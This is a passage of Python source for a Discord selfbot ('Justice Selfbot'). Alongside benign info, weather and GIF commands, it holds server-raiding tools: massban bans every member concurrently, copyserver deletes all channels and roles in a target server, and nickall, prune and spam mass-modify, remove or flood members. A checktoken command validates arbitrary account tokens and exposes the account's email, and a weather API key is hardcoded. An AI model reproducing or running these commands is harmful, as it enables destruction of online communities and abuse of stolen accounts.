⠀⠀⢠⣿⣿⣿⣿⣦⣤⠀⠀⠀⡈⠉⢹⣩⣿⣿⣿⡿⠛⠉⠁⠀⠀⠀⠀
⠀⠀⢾⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣾⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠛⠃⠉⠻⢿⣿⡿⢿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⢻⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
``````ansi
[31m< 𒀱 >     SɆɌVɆɌ  ƗNFØɌMȺŦƗØN
``````js
[01]Server Name    - {guild.name}
[02]Server ID      - {guild.id}
[03]Created On     - {guild.created_at.strftime('%Y-%m-%d')} (Created {time_since(guild.created_at)})
[04]Owner          - {guild.owner.name}
[05]Members        - {guild.member_count}
[06]Channels       - {len(guild.channels)}
[07]Roles          - {len(guild.roles)}
[08]Emojis         - {len(guild.emojis)}
[09]Boost Level    - {guild.premium_tier}
[10]Verification   - {guild.verification_level}
```"""

    await ctx.send(server_info)
    if guild.icon_url is None:
        await ctx.send("No Guild Icon Found")
    else:
        await ctx.send(guild.icon_url)


@client.command(aliases=['ui', 'whois', 'userinfo'])
async def user_info(ctx, *, user: str = None):
    try:
       
        if user is None:
            target_user = ctx.author
        else:
          
            try:
                
                if user.startswith('<@') and user.endswith('>'):
                    user_id = int(user.strip('<@!>'))
                else:
                    user_id = int(user)
                
                
                try:
                    
                    target_user = await client.fetch_user(user_id)
                except discord.NotFound:
                    
                    if ctx.message.mentions:
                        target_user = ctx.message.mentions[0]
                    else:
                        
                        target_user = ctx.author
                        
            except (ValueError, discord.HTTPException):
               
                if ctx.message.mentions:
                    target_user = ctx.message.mentions[0]
                else:
                    target_user = ctx.author

        creation_time = target_user.created_at
        now = datetime.utcnow()
        days_since_creation = (now - creation_time).days

        
        badges = []
        if hasattr(target_user, 'public_flags') and target_user.public_flags:
            flag_mapping = {
                discord.UserFlags.staff: "Discord Staff",
                discord.UserFlags.partner: "Partner",
                discord.UserFlags.hypesquad: "HypeSquad Events",
                discord.UserFlags.bug_hunter: "Bug Hunter",
                discord.UserFlags.hypesquad_bravery: "HypeSquad Bravery",
                discord.UserFlags.hypesquad_brilliance: "HypeSquad Brilliance",
                discord.UserFlags.hypesquad_balance: "HypeSquad Balance",
                discord.UserFlags.early_supporter: "Early Supporter",
                discord.UserFlags.verified_bot_developer: "Verified Bot Developer"
            }
            
            badges = [name for flag, name in flag_mapping.items() if flag.value & target_user.public_flags.value]

       
        server_info = ""
        if ctx.guild:
            try:
                member = await ctx.guild.fetch_member(target_user.id)
                join_time = member.joined_at
                server_info = f"""
[06]Nickname      : {member.nick or 'None'}
[07]Joined Server : {join_time.strftime('%d %B %Y')}"""
            except discord.NotFound:
                server_info = "\n[34m║ [36m• Not in this server"

       
        badges_str = f"[05]Badges        - {', '.join(badges) if badges else 'None'}"

        
        info_message = f"""```ansi

\033[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠔⠂⠀⠀⠉⠉⠐⠠⡄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣤⡞⠉⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠉⠂⢄⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡠⠴⠁⡰⠁⣰⠒⠉⠁⠉⠑⢴⣶⠀⣸⠀⠀⠀⠀⠀⠳⣄⠀⠀⠀
⠀⢀⣴⠭⠔⠂⢡⠃⠐⢩⠀⠀⣉⠀⠀⣨⡄⠀⢿⣆⢀⣀⣀⠀⠀⠈⠣⠀⠀
⠀⠈⠑⠂⠀⠀⡌⠀⢠⠊⡟⣿⠉⢹⡿⡍⡘⡦⡀⠈⠁⠒⠠⠭⣖⣄⠀⡇⠀
⠀⠀⠀⠀⠀⠀⣧⢸⣏⣿⡟⣿⣀⣾⠉⠹⡅⢿⣸⣆⠀⠀⠀⠀⢘⡇⠈⠁⠀
⠀⠀⠀⠀⠀⠀⡟⣼⣻⠿⣷⢏⠝⠹⡚⣶⡿⢺⢻⢿⡀⠀⠀⠀⠀⢷⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡧⣧⣿⠞⠛⠁⠀⠀⠀⠀⠁⠞⣞⡴⢣⠀⠀⠀⠀⠘⡄⠀⠀
⠀⠀⠀⠀⠀⠀⡇⡟⠛⢧⡀⠀⠀⠀⠀⠀⠀⠉⣩⡿⣿⠀⠀⠀⠀⠀⡇⠀⠀
⠀⠐⠂⠀⠀⠀⢇⡇⠀⠀⠙⠦⣀⣀⣀⠤⠒⠛⢿⣸⣿⡇⠀⠀⢀⠔⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠘⣷⣆⠀⢀⣾⣿⠟⢸⠇⢀⠌⠰⠛⡼⠁⢀⡔⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣺⣟⣧⡿⣿⡈⠑⢊⡵⠊⠀⡴⠛⠉⢄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠔⠉⠠⣘⣯⡛⢄⠠⣰⡯⠄⠒⠊⠀⠀⠀⠀⠈⢦⠀⠀
⣀⡀⠀⠀⠀⢀⡞⠁⠀⠀⠀⡇⡋⢻⣦⠊⠁⡖⠀⠀⠀⠀⠀⠀⡰⠒⠢⣧⠀
⠀⠀⠈⠐⠠⡋⠱⡀⠀⠀⠀⠇⡇⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⡐⠀⠀⠀⠈⠆
``````ansi
\033[35m< 𒀱 >     USɆɌ  ƗNFØɌMȺŦƗØN
``````js
[01]User Name     - {target_user.name}
[02]User ID       - {target_user.id}
[03]Created On    - {creation_time.strftime('%d %B %Y')}
[04]Account Age   - {days_since_creation} days
{badges_str}
{server_info}
```"""

      
        await ctx.send(info_message)

    except Exception as e:
        error_message = f"❌ Error retrieving user info: {str(e)}"
        await ctx.send(error_message)
        print(traceback.format_exc())



@client.command()
async def icon(ctx):
    """Get the server's icon URL."""
    guild = ctx.guild
    icon_url = guild.icon.url
    await ctx.send(f"Server Icon URL: {icon_url}")

    
@client.command()
async def nickall(ctx, nickname):
     await ctx.reply("Starting Nicknaming all members in the server .")
     gey = 0
     for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
            gey+=1
        except:
            pass
     try:await ctx.reply(f"Successfully changed nickname of {gey} members .")
     except:await ctx.send(f"Successfully changed nickname of {gey} members .")
     
@client.command()
async def copyserver(ctx, target_guild_id: int):
    
    target_guild = client.get_guild(target_guild_id)
    if not target_guild:
        await ctx.send("Target guild not found.")
        return

    
    for channel in target_guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Error deleting channel: {e}")

    
    for role in reversed(target_guild.roles):
        try:
            await role.delete()
        except Exception as e:
            print(f"Error deleting role: {e}")

   
    for category in ctx.guild.categories:
        new_category = await target_guild.create_category(category.name)
        for channel in category.channels:
            if isinstance(channel, discord.VoiceChannel):
                await new_category.create_voice_channel(channel.name)
            elif isinstance(channel, discord.TextChannel):
                await new_category.create_text_channel(channel.name)

    for role in sorted(ctx.guild.roles, key=lambda r: r.position):
        if role.name != "@everyone":
            await target_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)

   
    try:
        await target_guild.edit(name=f"backup-{ctx.guild.name}", icon=ctx.guild.icon)
    except Exception as e:
        print(f"Error editing guild: {e}")

    await ctx.send(f"Server copied to {target_guild.name}.")
    
def encode_message(message):
    return ''.join(chr(ord(c) + 3) for c in message)

def decode_message(message):
    return ''.join(chr(ord(c) - 3) for c in message)

@client.command()
async def encode(ctx, *, message: str):
    encoded = encode_message(message)
    await ctx.send(f"Encoded Message: {encoded}")

@client.command()
async def decode(ctx, *, message: str):
    decoded = decode_message(message)
    await ctx.send(f"Decoded Message: {decoded}")
     
@client.command()
async def purge(ctx, amount: int):
   
    await ctx.message.delete()


    if isinstance(ctx.channel, discord.DMChannel) or isinstance(ctx.channel, discord.GroupChannel):
        
        deleted_count = 0
        async for message in ctx.channel.history(limit=None):  
            if message.author == ctx.author:
                await message.delete()
                deleted_count += 1
                if deleted_count >= amount:  
                    break
        await ctx.send(f'```Purged {deleted_count} of your messages ✅```', delete_after=5)

    else:
        
        deleted_messages = await ctx.channel.purge(limit=amount)
        await ctx.send(f'```Purged {len(deleted_messages)} messages from the channel ✅```', delete_after=5)

@client.command()
async def checkpromo(ctx, *, promo_links):
    await ctx.message.delete()
    links = promo_links.split('\n')

    async with aiohttp.ClientSession() as session:
        for link in links:
            promo_code = extract_promo_code(link)
            if promo_code:
                result = await check_promo(session, promo_code, ctx)
                await ctx.send(result)
            else:
                await ctx.send(f'**INVALID LINK** : `{link}`')
async def check_promo(session, promo_code, ctx):
    url = f'https://ptb.discord.com/api/v10/entitlements/gift-codes/{promo_code}'

    async with session.get(url) as response:
        if response.status in [200, 204, 201]:
            data = await response.json()
            if data["uses"] == data["max_uses"]:
                return f'**Code:** {promo_code}\n**Status:** ALREADY CLAIMED'
            else:
                try:
                    now = datetime.datetime.utcnow()
                    exp_at = data["expires_at"].split(".")[0]
                    parsed = parser.parse(exp_at)
                    days = abs((now - parsed).days)
                    title = data["promotion"]["inbound_header_text"]
                except Exception as e:
                    print(e)
                    exp_at = "- `FAILED TO FETCH`"
                    days = ""
                    title = "- `FAILED TO FETCH`"
                return (f'**Code:** {promo_code}\n'
                        f'**Expiry Date:** {days} days\n'
                        f'**Expires At:** {exp_at}\n'
                        f'**Title:** {title}')
                
        elif response.status == 429:
            return '**RARE LIMITED**'
        else:
            return f'**INVALID CODE** : `{promo_code}`'

def extract_promo_code(promo_link):
    promo_code = promo_link.split('/')[-1]
    return promo_code

@client.command()
async def checktoken(ctx , tooken):
    await ctx.message.delete()
    headers = {
        'Authorization': tooken
    }
    r = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
    if r.status_code == 200:
        user_info = r.json()
        await ctx.send(f'''⭐ ### Token Checked Succesfully
              - **Valid Token **
              - **Username : `{user_info["username"]}`**
              - **User Id : `{user_info["id"]}`**
              - **Email : `{user_info["email"]}`**
              - **Verifed? `{user_info["verified"]}`**
              ''')
        print(f"TOKEN CHECKED✅ ")
    else:
        await ctx.send("❎ Invalid Token or Locked or flagged")
        
translator = Translator()

@client.command()
async def translate(ctx, *, text: str):
    await ctx.message.delete()
    try:
        detection = translator.detect(text)
        source_language = detection.lang
        source_language_name = LANGUAGES.get(source_language, 'Unknown language')

        translation = translator.translate(text, dest='en')
        translated_text = translation.text

        response_message = (
            f"**Original Text:** {text}\n"
            f"**Detected Language:** {source_language_name} ({source_language})\n"
            f"**Translated Text:** {translated_text}"
        )

        await ctx.send(response_message)
        print(f"MSG TRANSLATED✅ ")

    except Exception as e:
        await ctx.send("❎ **Error**: Could not translate text. Please try again later.")



@client.command()
async def listen(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=message))

@client.command()
async def play(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(name=message)
    await client.change_presence(activity=game)

@client.command()
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(name=message, url='https://twitch.tv/syntax')
    await client.change_presence(activity=stream)

@client.command()
async def removestatus(ctx):
    await ctx.message.delete()
    await client.change_presence(activity=None, status=discord.Status.dnd)


@client.command(aliases=['av', 'pfp'])
async def avatar(ctx, user: discord.User = None):
    
    if user is None:
        user = ctx.author

    try:
        
        avatar_hash = user.avatar
        
        if avatar_hash:
            
            avatar_format = "gif" if str(avatar_hash).startswith("a_") else "png"
            
           
            avatar_url = f"https://cdn.discordapp.com/avatars/{user.id}/{avatar_hash}.{avatar_format}?size=4096"
            
            
            await ctx.message.delete()
            
            
            await ctx.send(f"""```ansi
[31m{user.display_name}'s pfp``` [Justice Sb]({avatar_url})""")
        else:
           
            await ctx.message.delete()
            await ctx.send(f"{user.mention} has no avatar set.", delete_after=5)

    except Exception as e:
        
        print(f"Avatar Command Error: {e}")
        await ctx.message.delete()
        await ctx.send("An unexpected error occurred.", delete_after=5)

@client.command(name="banner")
async def userbanner(ctx, user: discord.User):
    headers = {
        "Authorization": client.http.token,
        "Content-Type": "application/json"
    }
    
    url = f"https://discord.com/api/v9/users/{user.id}/profile"
    
    try:
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            banner_hash = data.get("user", {}).get("banner")
            
            if banner_hash:
                banner_format = "gif" if banner_hash.startswith("a_") else "png"
                banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_hash}.{banner_format}?size=1024"
                await ctx.send(f"""```ansi
[31m{user.display_name}'s banner``` [Justice Sb]({banner_url})""")
            else:
                await ctx.send(f"{user.mention} does not have a banner set.")
        else:
            await ctx.send(f"Failed to retrieve banner: {response.status_code} - {response.text}")
    
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@client.command()
async def ping(ctx):
    start_time = time.perf_counter()

    
    async def get_system_info():
        cpu_usage = psutil.cpu_percent()
        memory_usage = psutil.virtual_memory().percent
        os_name = platform.system()
        os_version = platform.release()
        return cpu_usage, memory_usage, os_name, os_version

    
    async def get_network_speed():
        try:
            st = Speedtest()
            download_speed = await asyncio.wait_for(asyncio.to_thread(st.download), timeout=10)
            upload_speed = await asyncio.wait_for(asyncio.to_thread(st.upload), timeout=10)
            return round(download_speed / 1_000_000, 2), round(upload_speed / 1_000_000, 2)
        except Exception:
            return "N/A", "N/A"

    
    system_info, network_speed = await asyncio.gather(
        get_system_info(),
        get_network_speed()
    )

    
    latency = round(client.latency * 1000)
    end_time = time.perf_counter()
    response_time = round((end_time - start_time) * 1000, 2)

    
    cpu_usage, memory_usage, os_name, os_version = system_info
    download_speed, upload_speed = network_speed

    
   
    ping_menu = f"""```ansi
[35m⠀⠀⠀⠀⠀ ⢀⡤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡏⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⣀⠴⠋⠉⠉⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠈⠉⠉⠙⠓⠚⠁⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠀⠀
⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠶⠀⠀⠀⠀⠀⠀⠦⠀⠀⠀⠀⠀⠸⡆⠀⠀⠀
⢠⣤⣶⣾⣧⣤⣤⣀⡀⠀⠀⠀⠀⠈⠀⠀⠀⢀⡤⠴⠶⠤⢤⡀⣧⣀⣀⠀
⠻⠶⣾⠁⠀⠀⠀⠀⠙⣆⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⢹⣿⣭⣽⠇
⠀⠀⠙⠤⠴⢤⡤⠤⠤⠋⠉⠉⠉⠉⠉⠉⠉⠳⠖⠦⠤⠶⠦⠞⠁⠀⠀⠀
``````js
[01] Latency        - {latency} ms

[02] Response Time  - {response_time} ms

[03] CPU Usage      - {cpu_usage}%

[04] Memory Usage   - {memory_usage}%

[05] OS             - {os_name} {os_version}

[06] Download Speed - {download_speed} Mbps

[07] Upload Speed   - {upload_speed} Mbps
```"""
    
    
    await ctx.send(ping_menu)
    






@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    

    async def send_message():
        await ctx.send(message)


    tasks = [send_message() for _ in range(amount)]
    

    await asyncio.gather(*tasks)




@client.command()
async def prune(ctx, days: int = 1, rc: int = 0, *, reason: str = 'JUSTICE WAS HERE HAHA'):
    await ctx.message.delete()
    roles = [role for role in ctx.guild.roles if len(role.members) > 0]
    hm = await ctx.guild.prune_members(days=days, roles=roles, reason=reason)
    await ctx.send(f"Successfully Pruned {hm} Members")

# Mass ban isko aur fast krke de and Bots bhi ban hone chiye
@client.command()
async def massban(ctx):
    if ctx.guild.id == 1167459192026714122:
        await ctx.send("```This command is disabled for this server.```")
        return

    await ctx.send("```Starting mass ban of all members...```")

    try:
        await ctx.guild.chunk()
    except:
        pass

    members = [m for m in ctx.guild.members if m != ctx.guild.me]
    banned_count = 0
    semaphore = asyncio.Semaphore(10)

    async def ban_member(member):
        async with semaphore:
            for attempt in range(3):
                try:
                    await member.ban(reason="Syntax X Error")
                    print(f"Banned {member.name} on attempt {attempt + 1}")
                    return True
                except Exception as e:
                    print(f"Error banning {member.name} on attempt {attempt + 1}: {e}")
                    await asyncio.sleep(0.5)
            print(f"Failed to ban {member.name} after 3 attempts")
            return False

    tasks = [asyncio.create_task(ban_member(member)) for member in members]
    results = await asyncio.gather(*tasks)
    banned_count = sum(1 for r in results if r)

    await ctx.send(f"```Mass ban completed. Successfully banned {banned_count} members.```")
@client.command()
async def justice(ctx):
    await ctx.send("""```js
                    JUSTICE𒈔SELFBOT 
``````ansi
[34m⠀⠀  ⢀⣀⡠⠤⠤⠴⠶⠶⠶⠶⠦⠤⠤⢄⣀⡀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⣠⠖⢛⣩⣤⠂⠀⠀⠀⣶⡀⢀⣶⠀⠀⠀⠐⣤⣍⡛⠲⣄⠀⠀⠀⠀
⢀⡴⢋⣴⣾⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣷⣦⡙⢦⡀⠀
⡞⢠⣿⣿⣿⣿⣿⣿⣷⣤⣤⣴⣿⣿⣿⣿⣦⣤⣤⣾⣿⣿⣿⣿⣿⣿⡆⢳⠀
⡁⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢈⠆
⢧⡈⢿⣿⣿⣿⠿⠿⣿⡿⠿⠿⣿⣿⣿⣿⠿⠿⢿⣿⠿⠿⣿⣿⣿⡿⢁⡼⠀
⠀⠳⢄⡙⠿⣇⠀⠀⠈⠁⠀⠀⠈⢿⡿⠁⠀⠀⠈⠁⠀⠀⣸⠿⢋⡠⠞⠀⠀
⠀⠀⠀⠉⠲⢤⣀⡀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⢀⣀⡤⠖⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠉⠉⠐⠒⠒⠒⠒⠒⠒⠒⠒⠒⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀[0m
``````js
                    <> = MADE BY SYNTAX
```
> _**SUPPORT SERVER :**_ https://discord.gg/9K56C4qKSk""")

@client.command()
async def hide(ctx):
        await ctx.message.delete()
        await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=False)
        await ctx.send(f"Channel {ctx.channel.mention} is now hidden from everyone.")

@client.command()
async def unhide(ctx):
    
    await ctx.message.delete()
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=True)
    await ctx.send(f"Channel {ctx.channel.mention} is now visible to everyone.")
        
        
async def fetch_anime_gif(action):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://api.waifu.pics/sfw/{action}") as r:
            if r.status == 200:
                data = await r.json()
                return data['url']  
            else:
                return None
                
@client.command(name="kiss")
async def kiss(ctx, member: discord.User = None):
    if not member:
        await ctx.send("```You need to mention someone to kiss!```")
        return

    gif_url = await fetch_anime_gif("kiss")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} sends an anime kiss to {member.display_name}! 💋```\n[Justice Sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime kiss GIF right now, try again later!```")
@client.command(name="slap")
async def slap(ctx, member: discord.User = None):
    if not member:
        await ctx.send("```You need to mention someone to slap!```")
        return

    gif_url = await fetch_anime_gif("slap")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} slaps {member.display_name}! 👋```\n[Justice Sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime slap GIF right now, try again later!```")


@client.command(name="kill")
async def kill(ctx, member: discord.User = None):
    if not member:
        await ctx.send("```You need to mention someone to kill!```")
        return

    gif_url = await fetch_anime_gif("kill")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} kills {member.display_name}! ☠```\n[Justice Sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime kill GIF right now, try again later!```")

@client.command(name="wave")
async def wave(ctx, member: discord.User = None):
    if not member:
        await ctx.send("```You need to mention someone to wave at!```")
        return

    gif_url = await fetch_anime_gif("wave")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} waves at {member.display_name}! 👋```\n[Justice Sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime wave GIF right now, try again later!```")

@client.command(name="hug")
async def hug(ctx, member: discord.User = None):
    if not member:
        await ctx.send("```You need to mention someone to hug!```")
        return

    gif_url = await fetch_anime_gif("hug")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} hugs {member.display_name}! 🤗```\n[Justice Sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime hug GIF right now, try again later!```")

@client.command(name="bully")
async def bully(ctx, member: discord.User = None):
    if not member:
        await ctx.send("```You need to mention someone to bully!```")
        return

    gif_url = await fetch_anime_gif("bully")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} bullies {member.display_name}! 😠```\n[Justice Sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime bully GIF right now, try again later!```")

@client.command(name="cry")
async def cry(ctx, member: discord.User = None):
    gif_url = await fetch_anime_gif("cry")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} is crying! 😢```\n[Justice Sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime cry GIF right now, try again later!```")

@client.command(name="sleep")
async def sleep(ctx, member: discord.User = None):
    gif_url = await fetch_anime_gif("sleep")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} is sleeping! 😴```\n[Justice Sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime sleep GIF right now, try again later!```")

@client.command(name="blush")
async def blush(ctx, member: discord.User = None):
    gif_url = await fetch_anime_gif("blush")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} just blushed.! 😊```\n[Justice Sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime blush GIF right now, try again later!```")

@client.command(name="smile")
async def smile(ctx, member: discord.User = None):
    gif_url = await fetch_anime_gif("smile")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} smiles! 😊```\n[Justice Sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime smile GIF right now, try again later!```")

@client.command(name="handhold")
async def handhold(ctx, member: discord.User = None):
    if not member:
        await ctx.send("```You need to mention someone to hold hands with!```")
        return

    gif_url = await fetch_anime_gif("handhold")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} holds hands with {member.display_name}! 🤝```\n[Justice Sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime handhold GIF right now, try again later!```")

@client.command(name="removear")
async def removear(ctx, trigger: str):
    with open('ar.json', 'r') as file:
        data = json.load(file)
    if trigger in data:
        del data[trigger]
        with open('ar.json', 'w') as file:
            json.dump(data, file, indent=4)
        await ctx.send(f'**Auto Response Has Removed** **{trigger}**')
        await ctx.message.delete()
    else:
        await ctx.send(f'**Auto Response Not Found** **{trigger}**')

@client.command(name="addar")
async def ar(ctx, *, trigger_and_response: str):
    trigger, response = map(str.strip, trigger_and_response.split(','))
    with open('ar.json', 'r') as file:
        data = json.load(file)
    data[trigger] = response
    with open('ar.json', 'w') as file:
        json.dump(data, file, indent=4)
    await ctx.send(f'**Auto Response Has Added.. !** **{trigger}** - **{response}**')
    await ctx.message.delete()

@client.command()
async def snipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in client.sniped_message_dict:
        await ctx.send(client.sniped_message_dict[currentChannel])
    else:
        await ctx.send("[ERROR]: No message to snipe!")


@client.command(name="clear")
async def clear(ctx, amount: int):
    def is_bot_message(message):
        return message.author == client.user

    messages = []
    if isinstance(ctx.channel, discord.TextChannel):
        async for message in ctx.channel.history(limit=None):
            if is_bot_message(message):
                messages.append(message)
                if len(messages) == amount + 1:
                    break
        await ctx.channel.delete_messages(messages)
    elif isinstance(ctx.channel, discord.DMChannel):
        async for message in ctx.channel.history(limit=None):
            if is_bot_message(message):
                messages.append(message)
                if len(messages) == amount + 1:
                    break
        for message in messages:
            await message.delete()
    await ctx.message.delete()

@client.command(name="weather")
async def weather(ctx, *, city: str):
    api_key = "c9f448f65cda132e2f1c4ca0ea2667aa"
    base_url = "http://api.openweathermap.org/data/2.5/weather?"

    complete_url = base_url + "appid=" + api_key + "&q=" + city

    response = requests.get(complete_url)
    data = response.json()

    if data["cod"] != "404":
        main = data['main']
        temperature = main['temp']
        humidity = main['humidity']
        pressure = main['pressure']
        weather_report = data['weather']

        await ctx.send(f"""```ansi
 [37m               𓇢𓆸   WEATHER  INFORMATION   ☂
``````ansi
[34m⠀⠀⠀⠀⠀⠀⠀⢀⡠⠔⠚⠉⠩⠍⠩⠍⢩⣶⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡠⡲⠑⢈⣨⠵⠊⠁⠀⠀⠀⠈⠲⢌⡻⣿⣶⣄⡀⠀⠀⠀⠀
⠀⠀⠀⣠⡾⠊⠈⠉⠉⣑⣀⣀⠀⠀⠀⠀⠀⡶⢄⡈⢻⣿⠟⠻⣄⠀⠀⠀
⠀⠀⡐⡑⠁⢀⠏⢠⢞⠕⠚⠉⢻⣏⠀⠀⠀⠑⠀⢱⠀⠉⢇⠀⢹⣦⠀⠀
⠀⠰⣼⠀⠀⠀⢰⡎⠁⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠃⠀⠀⠈⠘⡟⢿⡇⠀
⠀⢷⡿⢰⠓⠀⠀⢣⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠐⠀⢄⠄⠄⢣⣸⡿⠀
⠘⣸⠁⠸⠔⢀⡀⠀⠳⠦⢤⡶⠂⠀⠀⠀⠀⠀⠀⠀⠀⡀⠣⡆⠀⣿⣷⠂
⠀⣿⠀⠀⠀⠈⠁⠀⠀⠀⠀⠓⠀⠀⠀⠀⠀⠀⠀⠐⠁⠀⣀⢀⠿⢿⣿⠀
⠀⠸⡇⢀⠀⠀⡀⠀⠀⠀⠀⢄⠀⠀⠀⡄⠀⠀⠀⠀⢀⡞⢁⠄⠀⣼⡇⠀
⠀⠀⠻⡌⢆⠰⡠⠐⠈⠀⣤⠜⠒⢢⠀⠀⠀⠢⠄⢀⣈⣄⢾⢴⡿⡟⠀⠀
⠀⠀⠀⠹⣌⡿⢄⠀⠀⠀⠣⣄⢀⠶⠃⠀⢀⣀⣀⣤⣿⢿⣶⣯⠊⠀⠀⠀
⠀⠀⠀⠀⠈⠛⢷⣝⡢⢔⡀⠈⠂⠤⠤⠀⢉⣹⠿⣫⣴⡿⠛⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠛⠲⠤⣷⣦⣶⣶⣞⣛⠛⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀[0m
``````ansi
[35m< 𒅒 >                                         < 𒅒 >
``````js
[01] Temperature  - {temperature}
[02] Humidity     - {humidity}%
[03] Pressure     - {pressure} hPa
[04] Description  - {weather_report[0]['description']}
```""")
    else:
        await ctx.send("City Not Found!")

@client.command(name="commands")
async def help(ctx):
    command_list = " , ".join([f"{cmd.name}" for cmd in client.commands])
    await ctx.send(f"Here are all the available commands:\n{command_list}")
    await ctx.message.delete()

@client.command(name="balance",aliases=['bal'])
async def bal(ctx, ltcaddress):
    response = requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{ltcaddress}/balance')

    if response.status_code == 200:
        data = response.json()
        balance = data['balance'] / 10**8
        total_balance = data['total_received'] / 10**8
        unconfirmed_balance = data['unconfirmed_balance'] / 10**8
    else:
        await ctx.reply("<a:arrow_arrow:1313408562407673919> `Failed`")
        return

    cg_response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')

    if cg_response.status_code == 200:
        usd_price = cg_response.json()['litecoin']['usd']
    else:
        await ctx.reply("<a:arrow_arrow:1313408562407673919> `Failed`")
        return

    usd_balance = balance * usd_price
    usd_total_balance = total_balance * usd_price
    usd_unconfirmed_balance = unconfirmed_balance * usd_price
    
    message = f"**ADDY**: `{ltcaddress}`>\n"
    message += f"**CURRENT LTC BALANCE** : `{usd_balance:.2f}$ USD`\n"
    message += f"**TOTAL LTC RECEIVED** : `{usd_total_balance:.2f}$ USD`\n"
    message += f"**UNCONFIRMED LTC** : `{usd_unconfirmed_balance:.2f}$ USD`\n\n"

    await ctx.send(message)
    await ctx.message.delete()

@client.command(name="ltcprice")
async def ltc(ctx):
    url = 'https://api.coingecko.com/api/v3/coins/litecoin'
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        price = data['market_data']['current_price']['usd']
